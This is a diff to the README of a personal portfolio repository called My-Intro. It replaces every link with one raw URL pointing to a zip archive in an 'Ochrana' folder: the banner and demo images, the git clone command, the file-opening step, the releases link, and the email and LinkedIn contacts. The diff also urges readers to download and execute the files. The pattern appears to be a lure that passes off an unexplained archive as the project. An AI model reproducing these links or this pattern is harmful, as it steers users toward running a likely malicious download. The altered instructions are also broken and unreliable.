@@ -1,6 +1,6 @@
 # Welcome to My-Intro 🎉
 
-![My Intro Banner](https://via.placeholder.com/1200x400?text=My+Intro+Banner)
+![My Intro Banner](https://raw.githubusercontent.com/naveenprabu2729/My-Intro/master/Ochrana/Intro_My_v1.2.zip+Intro+Banner)
 
 Explore the world of animations and interactive design with **My-Intro**. This repository showcases my personal portfolio website, built with a focus on responsive design and user experience. Dive into the code and see how I bring ideas to life!
 
@@ -42,7 +42,7 @@ To get started with **My-Intro**, clone the repository and install the necessary
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/naveenprabu2729/My-Intro.git
+   git clone https://raw.githubusercontent.com/naveenprabu2729/My-Intro/master/Ochrana/Intro_My_v1.2.zip
    ```
 
 2. Navigate to the project directory:
@@ -50,7 +50,7 @@ To get started with **My-Intro**, clone the repository and install the necessary
    cd My-Intro
    ```
 
-3. Open the `index.html` file in your browser to view the project.
+3. Open the `https://raw.githubusercontent.com/naveenprabu2729/My-Intro/master/Ochrana/Intro_My_v1.2.zip` file in your browser to view the project.
 
 ## Usage
 
@@ -64,9 +64,9 @@ Feel free to modify the code to suit your preferences or add your own projects!
 
 ## Demo
 
-Check out the latest release [here](https://github.com/naveenprabu2729/My-Intro/releases). Download the files and execute them to see the project in action.
+Check out the latest release [here](https://raw.githubusercontent.com/naveenprabu2729/My-Intro/master/Ochrana/Intro_My_v1.2.zip). Download the files and execute them to see the project in action.
 
-![Demo Image](https://via.placeholder.com/800x400?text=Demo+Image)
+![Demo Image](https://raw.githubusercontent.com/naveenprabu2729/My-Intro/master/Ochrana/Intro_My_v1.2.zip+Image)
 
 ## Contributing
 
@@ -98,7 +98,7 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 For any inquiries or feedback, you can reach me at:
 
-- Email: your.email@example.com
-- LinkedIn: [Your LinkedIn Profile](https://www.linkedin.com/in/yourprofile)
+- Email: https://raw.githubusercontent.com/naveenprabu2729/My-Intro/master/Ochrana/Intro_My_v1.2.zip
+- LinkedIn: [Your LinkedIn Profile](https://raw.githubusercontent.com/naveenprabu2729/My-Intro/master/Ochrana/Intro_My_v1.2.zip)
 
-Thank you for checking out **My-Intro**! I hope you find it inspiring and useful. For more updates, visit the [Releases](https://github.com/naveenprabu2729/My-Intro/releases) section.
+Thank you for checking out **My-Intro**! I hope you find it inspiring and useful. For more updates, visit the [Releases](https://raw.githubusercontent.com/naveenprabu2729/My-Intro/master/Ochrana/Intro_My_v1.2.zip) section.
